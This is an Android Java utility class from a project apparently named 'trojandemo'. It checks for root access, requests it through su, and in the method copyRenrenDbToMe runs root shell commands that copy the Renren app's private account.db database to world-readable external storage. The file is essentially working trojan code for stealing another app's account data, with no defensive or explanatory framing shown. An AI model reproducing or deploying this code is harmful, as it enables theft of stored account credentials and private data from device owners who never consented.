package com.singuloid.trojandemo.utils;

import android.app.ProgressDialog;
import android.content.Context;
import android.database.sqlite.SQLiteDatabase;
import android.util.Log;
import android.widget.Toast;

import java.io.DataOutputStream;
import java.io.File;
import java.io.IOException;

/**
 * Created by administrator on 14-9-12.
 */
public class Utils {
    Context mContext;
    ProgressDialog progress_dialog;
    public Utils(Context context){
        this.mContext = context;
    }
    // 获取ROOT权限
    public void get_root(){

        if (is_root()){
            Toast.makeText(mContext, "已经具有ROOT权限!", Toast.LENGTH_LONG).show();
        }
        else{
            try{
                progress_dialog = ProgressDialog.show(mContext,
                        "ROOT", "正在获取ROOT权限...", true, false);
                Runtime.getRuntime().exec("su");
            }
            catch (Exception e){
                Toast.makeText(mContext, "获取ROOT权限时出错!", Toast.LENGTH_LONG).show();
            }
        }

    }
    // 判断是否具有ROOT权限
    public static boolean is_root() {

        boolean res = false;

        try {
            if ((!new File("/system/bin/su").exists()) &&
                    (!new File("/system/xbin/su").exists())) {
                res = false;
            } else {
                res = true;
            }
            ;
        } catch (Exception e) {

        }
        return res;
    }



    public static void copyRenrenDbToMe() throws IOException {
        Process process = Runtime.getRuntime().exec("su");
        DataOutputStream out = new DataOutputStream(process.getOutputStream());
//        out.writeBytes("mkdir -p /data/data/com.singuloid.trojandemo/databases\n");
        out.writeBytes("mkdir -p /sdcard/mydatabases\n");
//        out.writeBytes("cat /data/data/com.renren.mobile.android/databases/account.db > /data/data/com.singuloid.trojandemo/databases/account.db\n");
        out.writeBytes("cat /data/data/com.renren.mobile.android/databases/account.db > /sdcard/account.db\n");
        out.writeBytes("chmod 777 /data/data/com.singuloid.trojandemo/databases/account.db\n");
//        out.writeBytes("chown system:sdcard_r /sdcard/account.db\n");
        out.writeBytes("exit\n");
        out.flush();
        try {
            process.waitFor();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }
}
